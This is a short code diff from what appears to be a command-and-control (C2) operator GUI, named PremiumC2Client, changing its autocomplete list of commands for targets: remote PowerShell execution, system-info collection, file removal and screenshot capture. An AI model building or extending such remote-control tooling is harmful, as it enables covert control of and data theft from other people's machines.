@@ -65,7 +65,7 @@ class PremiumC2Client(ctk.CTk):
 
         # === AUTOCOMPLETE COMMAND LISTS ===
         self.global_commands = ["AUTH:STOP_HTTP", "AUTH:START_HTTP"]
-        self.target_commands = ["tm powershell -command \"", "$sysinfo", "rmf" , "$screenShot"]
+        self.target_commands = ["shell powershell -command \"", "$sysinfo", "rmf" , "print", "$screenShot"]
         
         self.current_commands = self.global_commands  # default mode
 
